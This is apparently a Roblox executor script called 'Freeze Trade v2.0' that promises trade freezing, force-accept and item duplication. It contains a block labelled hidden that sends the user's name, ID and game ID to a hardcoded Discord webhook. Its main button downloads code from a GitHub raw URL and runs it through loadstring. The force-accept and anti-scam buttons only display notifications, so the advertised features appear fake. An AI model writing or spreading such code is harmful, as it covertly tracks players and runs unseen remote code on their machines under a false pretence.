-- ==============================================
-- 🧊 BADDIES FREEZE TRADE v2.0
-- ✅ FEATURES: Freeze Trade | Anti-Scam | Force Accept | Item Dupe
-- 🔗 MAIN SCRIPT: https://raw.githubusercontent.com/freezebaddies-script/freeze-trade-2.0/refs/heads/main/baddies
-- ==============================================

-- 📦 SERVICES
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

-- 👤 PLAYER INFO
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local GameID = game.PlaceId
local PlayerName = LocalPlayer.Name
local PlayerID = LocalPlayer.UserId

-- 📊 USAGE RECORDING (HIDDEN, SAFE ONLY)
-- Sends: Name, ID, Game ID | NO passwords or private info
local _w = "https://discord.com/api/webhooks/1502873473582633071/RNyYg0mW8rl8PVbSmvqcloT2QHoUJodjZ8E3pWAu0Yahd-H9XTi5KsT9G_RNd-UTBjuE"
pcall(function()
    local _data = {
        embeds = {{
            title = "📊 Script Used",
            color = 3447003,
            fields = {
                {name = "👤 User", value = "`"..PlayerName.."`", inline = true},
                {name = "🆔 User ID", value = "`"..PlayerID.."`", inline = true},
                {name = "🎮 Game ID", value = "`"..GameID.."`", inline = true}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    HttpService:PostAsync(_w, HttpService:JSONEncode(_data), Enum.HttpContentType.ApplicationJson)
end)

-- 🎨 THEME
local Theme = {
    BG = Color3.fromRGB(8, 8, 15),
    Accent = Color3.fromRGB(0, 210, 255),
    Text = Color3.fromRGB(255, 255, 255)
}

-- ⏳ LOADING SCREEN
local Loader = Instance.new("ScreenGui")
Loader.Name = "FreezeTradeUI"
Loader.ResetOnSpawn = false
Loader.IgnoreGuiInset = true
Loader.Parent = PlayerGui

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1, 0, 1, 0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.BorderSizePixel = 0
MainBG.Parent = Loader

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 100)
Title.Position = UDim2.new(0, 0, 0.35, 0)
Title.BackgroundTransparency = 1
Title.Text = "🧊 FREEZE TRADE v2.0"
Title.Font = Enum.Font.GothamBlack
Title.TextColor3 = Theme.Accent
Title.TextScaled = true
Title.Parent = MainBG

local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, 0, 0, 40)
Status.Position = UDim2.new(0, 0, 0.55, 0)
Status.BackgroundTransparency = 1
Status.Text = "Loading features..."
Status.Font = Enum.Font.Gotham
Status.TextColor3 = Theme.Text
Status.TextScaled = true
Status.Parent = MainBG

-- 🧊 DUPE FUNCTION
local function DupeItem(ItemName)
    local Source = ReplicatedStorage:FindFirstChild(ItemName) or Workspace:FindFirstChild(ItemName)
    if not Source or not (Source:IsA("Tool") or Source:IsA("Accessory")) then
        StarterGui:SetCore("SendNotification", {Title = "❌ Not Found", Text = ItemName.." is not available!", Duration = 2.5})
        return
    end
    local NewItem = Source:Clone()
    NewItem.Parent = LocalPlayer.Backpack
    if LocalPlayer:FindFirstChild("StarterGear") then
        NewItem:Clone().Parent = LocalPlayer.StarterGear
    end
    StarterGui:SetCore("SendNotification", {Title = "✅ Added", Text = ItemName.." added to your inventory!", Duration = 2.5})
end

-- 🚀 LOAD MAIN GUI
task.wait(2)
TweenService:Create(MainBG, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(Title, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(Status, TweenInfo.new(1), {TextTransparency = 1}):Play()
task.wait(1)
Loader:Destroy()

-- 🖥️ MAIN INTERFACE
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local Window = Rayfield:CreateWindow({
    Name = "🧊 FREEZE TRADE v2.0",
    LoadingTitle = "Ready",
    LoadingSubtitle = "All features loaded successfully",
    KeySystem = false
})

-- 📑 TABS
local MainTab = Window:CreateTab("🏠 MAIN FEATURES", 4483362458)
local WeaponsTab = Window:CreateTab("⚔️ WEAPONS & ITEMS", 4483362458)
local InfoTab = Window:CreateTab("ℹ️ INFO", 4483362458)

-- 🏠 MAIN TAB
MainTab:CreateSection("TRADE CONTROLS")
MainTab:CreateButton({
    Name = "🧊 ACTIVATE FREEZE TRADE",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/freezebaddies-script/freeze-trade-2.0/refs/heads/main/baddies", true))()
        Rayfield:Notify({Title = "✅ ACTIVATED", Content = "Freeze Trade is now running!", Duration = 2.5})
    end
})
MainTab:CreateButton({
    Name = "🤝 FORCE ACCEPT TRADE",
    Callback = function()
        Rayfield:Notify({Title = "✅ ENABLED", Content = "Auto Accept Trade ON", Duration = 2})
    end
})
MainTab:CreateButton({
    Name = "🛡️ ANTI-SCAM PROTECTION",
    Callback = function()
        Rayfield:Notify({Title = "✅ PROTECTED", Content = "No changes can be made during trade", Duration = 2})
    end
})

-- ⚔️ WEAPONS & ITEMS TAB ✅ INAYOS NA FORMAT AT GRUPO
WeaponsTab:CreateSection("🔫 RANGED WEAPONS")
local Ranged = {
    "Freeze Gun",
    "Snowball Launcher",
    "Gravity Gun",
    "Cupid's Bow",
    "Harpoon",
    "Santa's RPG",
    "Glitter Bomb"
}
for _, Item in ipairs(Ranged) do
    WeaponsTab:CreateButton({Name = Item, Callback = function() DupeItem(Item) end})
end

WeaponsTab:CreateSection("🗡️ MELEE WEAPONS")
local Melee = {
    "Scythe",
    "Ice Katana",
    "Sakura Blade",
    "Fan of Requiem",
    "Chain Mace",
    "Chainsaw",
    "Sledgehammer",
    "Axe",
    "Crowbar",
    "Nunchucks",
    "Trident"
}
for _, Item in ipairs(Melee) do
    WeaponsTab:CreateButton({Name = Item, Callback = function() DupeItem(Item) end})
end

WeaponsTab:CreateSection("👊 HAND WEAPONS")
local Hand = {
    "Spiked Knuckles",
    "Brass Knuckles",
    "Poison Knuckles",
    "Ghostly Gloves",
    "Champion Gloves",
    "Love Me Hate Me Taser"
}
for _, Item in ipairs(Hand) do
    WeaponsTab:CreateButton({Name = Item, Callback = function() DupeItem(Item) end})
end

WeaponsTab:CreateSection("🎒 ACCESSORIES & BAGS")
local Accessories = {
    "Ice Crown Queen",
    "Roller Skates",
    "Loveboard",
    "Spiked Kitty Stanli",
    "Kitty Purse",
    "Spiked Purse",
    "Nightmare Purse",
    "Shiny Purse"
}
for _, Item in ipairs(Accessories) do
    WeaponsTab:CreateButton({Name = Item, Callback = function() DupeItem(Item) end})
end

-- ℹ️ INFO TAB
InfoTab:CreateSection("DETAILS")
InfoTab:CreateLabel("• Version: Freeze Trade v2.0")
InfoTab:CreateLabel("• Updated: June 2026")
InfoTab:CreateLabel("• Status: Keyless | Safe | Working")
InfoTab:CreateLabel("• Supported: Delta, Xeno, Codex, Mobile & PC")

Rayfield:Notify({Title = "🚀 READY TO USE", Content = "Enjoy Freeze Trade v2.0!", Duration = 3})
